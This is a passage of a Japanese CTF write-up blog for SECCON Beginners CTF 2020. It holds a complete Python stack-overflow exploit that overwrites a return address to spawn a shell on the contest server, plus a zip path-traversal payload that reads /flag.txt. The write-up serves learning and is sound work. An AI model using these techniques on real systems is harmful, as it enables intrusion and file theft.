</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>先ほど<code>null</code>だった部分を<code>current_timestamp</code>に変更して現在時刻を取得するようにするとフラグを得ることができました．</p> <h3 id="beginner-s-stack"><a href="#beginner-s-stack" class="header-anchor">#</a> Beginner's Stack</h3> <p>Pwnのスタックバッファオーバーフローの問題です．実行ファイルが配布されます．
問題サーバに接続すると以下のように表示されます．
<code>win</code>を呼び出せば<code>system('/bin/sh')</code>が実行されるようですが，<code>main</code>をディスアセンブルしても<code>win</code>を呼び出している箇所はありません．
というわけでどこかの関数のリターンアドレスを書き換えて<code>win</code>に飛ばせれば良さそうです．</p> <div class="language- line-numbers-mode"><pre class="language-text"><code> 9001
Your goal is to call `win` function (located at 0x400861)
   [ Address ]           [ Stack ]
                   +--------------------+
0x00007ffcfd4212b0 | 0x0000000000000000 | &lt;-- buf
                   +--------------------+
0x00007ffcfd4212b8 | 0x0000000000000000 |
                   +--------------------+
0x00007ffcfd4212c0 | 0x0000000000000000 |
                   +--------------------+
0x00007ffcfd4212c8 | 0x00007f9ada20d170 |
                   +--------------------+
0x00007ffcfd4212d0 | 0x00007ffcfd4212e0 | &lt;-- saved rbp (vuln)
                   +--------------------+
0x00007ffcfd4212d8 | 0x000000000040084e | &lt;-- return address (vuln)
                   +--------------------+
0x00007ffcfd4212e0 | 0x0000000000400ad0 | &lt;-- saved rbp (main)
                   +--------------------+
0x00007ffcfd4212e8 | 0x00007f9ad9c14b97 | &lt;-- return address (main)
                   +--------------------+
0x00007ffcfd4212f0 | 0x0000000000000001 |
                   +--------------------+
0x00007ffcfd4212f8 | 0x00007ffcfd4213c8 |
                   +--------------------+
Input:
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p>親切にスタックの状況を表示してくれます．何かしらの入力を与えると入力した内容がスタックに格納されてもう一度表示されます．
試しにaaaをいくつか入力します．すると，</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>   [ Address ]           [ Stack ]
                   +--------------------+
0x00007ffcfd4212b0 | 0x6161616161616161 | &lt;-- buf
                   +--------------------+
0x00007ffcfd4212b8 | 0x0000000a61616161 |
                   +--------------------+
0x00007ffcfd4212c0 | 0x0000000000000000 |
                   +--------------------+
0x00007ffcfd4212c8 | 0x00007f9ada20d170 |
                   +--------------------+
0x00007ffcfd4212d0 | 0x00007ffcfd4212e0 | &lt;-- saved rbp (vuln)
                   +--------------------+
0x00007ffcfd4212d8 | 0x000000000040084e | &lt;-- return address (vuln)
                   +--------------------+
0x00007ffcfd4212e0 | 0x0000000000400ad0 | &lt;-- saved rbp (main)
                   +--------------------+
0x00007ffcfd4212e8 | 0x00007f9ad9c14b97 | &lt;-- return address (main)
                   +--------------------+
0x00007ffcfd4212f0 | 0x0000000000000001 |
                   +--------------------+
0x00007ffcfd4212f8 | 0x00007ffcfd4213c8 |
                   +--------------------+
Bye!
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>こんな感じにスタックの状況が変化します．もっと多くのaを入力すると，</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>   [ Address ]           [ Stack ]
                   +--------------------+
0x00007ffea45ceb70 | 0x6161616161616161 | &lt;-- buf
                   +--------------------+
0x00007ffea45ceb78 | 0x6161616161616161 |
                   +--------------------+
0x00007ffea45ceb80 | 0x6161616161616161 |
                   +--------------------+
0x00007ffea45ceb88 | 0x6161616161616161 |
                   +--------------------+
0x00007ffea45ceb90 | 0x6161616161616161 | &lt;-- saved rbp (vuln)
                   +--------------------+
0x00007ffea45ceb98 | 0x6161616161616161 | &lt;-- return address (vuln)
                   +--------------------+
0x00007ffea45ceba0 | 0x6161616161616161 | &lt;-- saved rbp (main)
                   +--------------------+
0x00007ffea45ceba8 | 0x00007f0a61616161 | &lt;-- return address (main)
                   +--------------------+
0x00007ffea45cebb0 | 0x0000000000000001 |
                   +--------------------+
0x00007ffea45cebb8 | 0x00007ffea45cec88 |
                   +--------------------+
/home/pwn/redir.sh: line 2: 23776 Segmentation fault      ./chall
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>スタックがオーバーフローしてセグフォで落ちました．
というわけでスタックバッファオーバーフローで<code>vuln</code>のリターンアドレスを<code>win</code>のアドレスに書き換えます．
ペイロードはこのように組み立てました．</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span>
payload <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">0x7fff6858b810</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token comment"># '\x10\xb8\x58\x68\xff\x7f\x00\x00'</span>
payload <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">0x400861</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token comment"># '\x61\x08\x40\x00' + '\x00' * 4</span>
payload <span class="token operator">+=</span> b'\n
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><code>vuln</code>のrbpの値は適当に値を入れていますが，40バイト目以降に<code>win</code>のアドレスを書き込んでいます．
これで実行すると，スタックの内容が書きかわり，以下のようなメッセージが出力されました．</p> <blockquote><p>Oops! RSP is misaligned!
Some functions such as <code>system</code> use <code>movaps</code> instructions in libc-2.27 and later.
This instruction fails when RSP is not a multiple of 0x10.
Find a way to align RSP! You're almost there!</p></blockquote> <p><code>system</code>を呼び出すためにはRSPの値が<code>0x10</code>の倍数でないといけないようです．はて？という感じでしたが，とにかくRSPを揃えるには関数を呼び出す時と終了する際に何かしら手を加える必要がありそうです．
ここで，<code>win</code>のアドレスに飛ばす前に一度<code>ret</code>を噛ませてrspを揃えてみます．
組み立てたペイロードは以下のような感じ．</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span>
payload <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">0x7fff6858b810</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token comment"># '\x10\xb8\x58\x68\xff\x7f\x00\x00'</span>
payload <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">0x4007f0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token comment"># '\xf0\x07\x40\x00\x00\x00\x00\x00'</span>
payload <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">0x400861</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token comment"># '\x61\x08\x40\x00' + '\x00' * 4</span>
payload <span class="token operator">+=</span> <span class="token string">b'\n'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><code>win</code>のアドレスに飛ぶ前に'vuln'から復帰する時に呼び出される<code>ret</code>のアドレスに一度飛ばします．そうすると，<code>ret</code>はスタックをpopしてそのアドレスに飛ぶので，その時点でのスタックの一番上である<code>ret</code>のアドレスの直後に<code>win</code>のアドレスを書き込みます．
こうすることでRSPが揃った状態で<code>system</code>を呼び出すことができるようになります．
exploitコードの全体は以下．</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> socket<span class="token punctuation">,</span> time<span class="token punctuation">,</span> telnetlib
s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'bs.quals.beginners.seccon.jp'</span><span class="token punctuation">,</span> <span class="token number">9001</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span>
payload <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">0x7fff6858b810</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token comment"># '\x10\xb8\x58\x68\xff\x7f\x00\x00'</span>
payload <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">0x4007f0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token comment"># '\xf0\x07\x40\x00\x00\x00\x00\x00'</span>
payload <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">0x400861</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token comment"># '\x61\x08\x40\x00' + '\x00' * 4</span>
payload <span class="token operator">+=</span> <span class="token string">b'\n'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;payload: &quot;</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
t <span class="token operator">=</span> telnetlib<span class="token punctuation">.</span>Telnet<span class="token punctuation">(</span><span class="token punctuation">)</span>
t<span class="token punctuation">.</span>sock <span class="token operator">=</span> s
t<span class="token punctuation">.</span>interact<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>実行すると，これまでと同様にスタックの内容が表示された後Congratulations!が表示されシェルをとることができました．</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>Congratulations!
ls
chall
flag.txt
redir.sh
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>あとは<code>ls</code>,<code>cat flag.txt</code>でフラグが得られました．
余談ですが，僕はMacの方は<code>python</code>で<code>python3</code>が実行されるようにエイリアスしているのですが，解析に使用したVMでは<code>python</code>コマンドを叩くと実行されるのは<code>python3</code>なんです．VMではローカルで実行しながら解析してpython2でペイロード流していたんですが，ncでリモートに繋ぐ時はMacのターミナルからしていたのでpythonのバージョンが違っているままリモートに実行してしまいエクスプロイトが通りませんでした．すごいありがちなミスですがこれに気づくのに結構時間潰したのでpythonのバージョンには皆さんも気をつけてください．(戒め)</p> <h3 id="unzip"><a href="#unzip" class="header-anchor">#</a> unzip</h3> <p>Web問のディレクトリトラバーサルの問題です．phpで書かれたファイルと<code>docker-compose.yml</code>は配布されました．
この問題は時間内にフラグを得ることができませんでしたが，終了後に再度チャレンジしてフラグをとることができました．(点数欲しかった)
さて指定されたURLにアクセスするとzipファイルを解凍してくれるサービスが動いていました．
zipファイルをアップロードすると解凍され，解凍後のファイルの中身を参照することができます．
脆弱なコードは以下．</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$user_dir</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;/uploads/&quot;</span> <span class="token punctuation">.</span> <span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// return file if filename parameter is passed</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;filename&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;filename&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;filename&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;files&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean constant">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token variable">$user_dir</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">&quot;/&quot;</span> <span class="token punctuation">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;filename&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Content-Type: text/plain&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;no such file&quot;</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>もしこれまでアップロードされ，解凍されたファイルの名前とリクエストされたファイルの名前が一致している場合，<code>$filepath</code>として<code>$user_dir/filename</code>というふうに結合します．<code>$user_dir</code>は<code>$user_dir = &quot;/uploads/&quot; . session_id();</code>という感じで生成されています．
入力されたパスの値をバリデーションしていないので，<code>../</code>のような入力がそのまま通ってしまいます．これを利用してフラグを読み出します．
ここで<code>docker-compose.yml</code>をみてみると以下のような記述があります．</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>    volumes:
      - ./public:/var/www/web
      - ./uploads:/uploads
      - ./flag.txt:/flag.tx
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>フラグのファイルは<code>/flag.txt</code>に配置されていて，アップロードされたファイルは<code>/uploads/[session id]/filename</code>に保存されている感じです．
つまり，<code>filename</code>として<code>../../../flag.txt</code>という文字列を与えることができれば目的のパスにアクセスできます．
ここで僕はどのようにして<code>../../../flag.txt</code>というファイルを生成するか悩んでいました．base64でエンコードしたファイルを渡したりエスケープされた状態のファイル名で渡してみたりしましたがどうもうまくいきません．
本番はここでタイムアップとなりました．
その後，ダメもとで</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>$ zip hoge ../../../flag.txt
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>を実行してみると，</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>zip warning: name not matched: ../../../flag.txt
zip error: Nothing to do! (hoge.zip)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ん？できそう？？？
エラーの内容がファイルないよっていうエラーなのでもしやと思い</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>touch ../../../flag.txt
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>で作成して，もう一度実行してみると．．．</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>$ zip hoge ../../../flag.txt
  adding: ../../../flag.txt (stored 0%)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>あらできてしまいました．
これをアップロードしてアクセスするとフラグが得られてしまいました．</p> <p>時間内に気づけばよかった．．．</p> <h2 id="まとめ"><a href="#まとめ" class="header-anchor">#</a> まとめ</h2> <p>とりあえずわかっている問題はこんな感じでした．CTFは結構ブランクを開けて(元々全然できません)最近Pwnに入門したところでした．他にもheap問に取り組んだりしていたのですが，自分でフラグを通すことはできませんでした．それでも昨年参加した際は何もできなかったので今回は何問か解くことができてよかったです．CTF楽しかったのでこれからもう少しCTFに入門してみようかなと思います．
弊研究室チームは79位でした．対戦してくださった皆さんありがとうございました．
1000チーム以上の参加がある中大きな問題なく実施してくださった運営の方々に感謝します．ありがとうございました．</p> <div></div></div></article> <section class="post-meta main-div" data-v-4e23451f><section class="post-date clearfix" data-v-4e23451f><span class="create-date" data-v-4e23451f>
      Created : 2020-05-24
    </span> <span class="update-date" data-v-4e23451f>
      Updated : 2020-06-04
    </span></section> <section class="post-links" data-v-4e23451f><a href="/posts/2020/05/08/container.html" class="post-link" data-v-4e23451f>
      Previous Post : 自作コンテナランタイムでつまずいてる話
    </a> <a href="/posts/2020/06/04/elementary-stack.html" class="post-link" data-v-4e23451f>
      Next Post : SECCON Beginners CTF 2020 Elementary stackを理解する
    </a></section></section> <div id="post-comments" class="main-div"><!----></div></div></main> <aside class="aside" data-v-4dd605a1><div class="info-card main-div" data-v-9d847660 data-v-4dd605a1><div class="info-card-header" style="background-size:cover;background-repeat:no-repeat;background-position:center;background-attachment:scroll;background-image:url(/img/bg.jpg);" data-v-9d847660><img src="/img/avatar.jpg" alt="terassyi" class="info-avatar" data-v-9d847660></div> <div class="info-card-body" data-v-9d847660><section class="info-nickname" data-v-9d847660>
      terassyi
    </section> <section class="info-desc" data-v-9d847660>Fortune favors the brave</section> <section class="info-contact" data-v-9d847660><section data-v-9d847660><span title="Fukuoka City, Japan" data-v-9d847660 data-v-9d847660><svg class="icon" style="font-size:1em;" data-v-9d847660 data-v-9d847660><title data-v-9d847660 data-v-9d847660>Fukuoka City, Japan</title><use xlink:href="#icon-location" data-v-9d847660 data-v-9d847660></use></svg><span class="info-text" data-v-9d847660 data-v-9d847660>
          Fukuoka City, Japan
        </span></span></section> <section data-v-9d847660><span title="Kyushu University" data-v-9d847660 data-v-9d847660><svg class="icon" style="font-size:1em;" data-v-9d847660 data-v-9d847660><title data-v-9d847660 data-v-9d847660>Kyushu University</title><use xlink:href="#icon-organization" data-v-9d847660 data-v-9d847660></use></svg><span class="info-text" data-v-9d847660 data-v-9d847660>
          Kyushu University
        </span></span></section> <section data-v-9d847660><a href="mailto:iscale821@gmail.com" title="iscale821@gmail.com" data-v-9d847660 data-v-9d847660><svg class="icon" style="font-size:1em;" data-v-9d847660 data-v-9d847660><title data-v-9d847660 data-v-9d847660>iscale821@gmail.com</title><use xlink:href="#icon-email" data-v-9d847660 data-v-9d847660></use></svg><span class="info-text" data-v-9d847660 data-v-9d847660>
          iscale821@gmail.com
        </span></a></section></section></div> <div class="info-card-footer" data-v-9d847660><section class="info-sns clearfix" data-v-9d847660><a href="https://github.com/terassyi" target="_blank" class="sns-link" data-v-9d847660><span title="GitHub: terassyi" class="sns-icon" data-v-9d847660 data-v-9d847660><svg class="icon" style="font-size:1.5em;" data-v-9d847660 data-v-9d847660><title data-v-9d847660 data-v-9d847660>GitHub: terassyi</title><use xlink:href="#icon-github" data-v-9d847660 data-v-9d847660></use></svg></span></a><a href="https://twitter.com/terassyi_" target="_blank" class="sns-link" data-v-9d847660><span title="Twitter: terassyi" class="sns-icon" data-v-9d847660 data-v-9d847660><svg class="icon" style="font-size:1.5em;" data-v-9d847660 data-v-9d847660><title data-v-9d847660 data-v-9d847660>Twitter: terassyi</title><use xlink:href="#icon-twitter" data-v-9d847660 data-v-9d847660></use></svg></span></a></section></div></div> <div class="post-nav-card main-div" style="position:relative;top:0;width:0px;" data-v-4dd605a1><div class="post-nav-contents"><svg class="icon"><title>book</title><use xlink:href="#icon-book"></use></svg> <span>Table of Contents</span> <div class="post-nav-toc"><ul><li><a href="/posts/2020/05/24/ctf4b.html#ctf4b">ctf4b</a><ul><li><a href="/posts/2020/05/24/ctf4b.html#追記">追記</a></li><li><a href="/posts/2020/05/24/ctf4b.html#readme">readme</a></li><li><a href="/posts/2020/05/24/ctf4b.html#tweetstore">Tweetstore</a></li><li><a href="/posts/2020/05/24/ctf4b.html#beginner-s-stack">Beginner's Stack</a></li><li><a href="/posts/2020/05/24/ctf4b.html#unzip">unzip</a></li></ul></li><li><a href="/posts/2020/05/24/ctf4b.html#まとめ">まとめ</a></li></ul></div></div> <div class="post-nav-comments"><svg class="icon"><title>comment</title><use xlink:href="#icon-comment"></use></svg> <a href="/posts/2020/05/24/ctf4b.html#post-comments">
      Comments
    </a></div></div></aside></div> <footer class="footer" data-v-1375e54c><p class="footer-sns-links" data-v-1375e54c><a href="https://github.com/terassyi" target="_blank" class="sns-link" data-v-1375e54c><span title="GitHub: terassyi" class="sns-icon" data-v-1375e54c data-v-1375e54c><svg class="icon" style="font-size:25px;" data-v-1375e54c data-v-1375e54c><title data-v-1375e54c data-v-1375e54c>GitHub: terassyi</title><use xlink:href="#icon-github" data-v-1375e54c data-v-1375e54c></use></svg></span></a><a href="https://twitter.com/terassyi_" target="_blank" class="sns-link" data-v-1375e54c><span title="Twitter: terassyi" class="sns-icon" data-v-1375e54c data-v-1375e54c><svg class="icon" style="font-size:25px;" data-v-1375e54c data-v-1375e54c><title data-v-1375e54c data-v-1375e54c>Twitter: terassyi</title><use xlink:href="#icon-twitter" data-v-1375e54c data-v-1375e54c></use></svg></span></a></p> <p class="footer-text" data-v-1375e54c><span data-v-1375e54c>Powered by </span> <a href="https://github.com/vuejs/vuepress" target="_blank" data-v-1375e54c>
      VuePress
    </a> <span data-v-1375e54c> | </span> <a href="https://github.com/meteorlxy/vuepress-theme-meteorlxy" target="_blank" data-v-1375e54c>
        meteorlxy
      </a></p> <p class="footer-text" data-v-1375e54c>Copyright 2018-present <a href="https://github.com/meteorlxy" target="_blank">meteorlxy</a> | MIT License</p></footer></div><div class="global-ui"><!----><!----></div></div>
    <script src="/assets/js/app.f8942ceb.js" defer></script><script src="/assets/js/10.b0186384.js" defer></script><script src="/assets/js/5.9479a820.js" defer></script>
  </body>
</html>
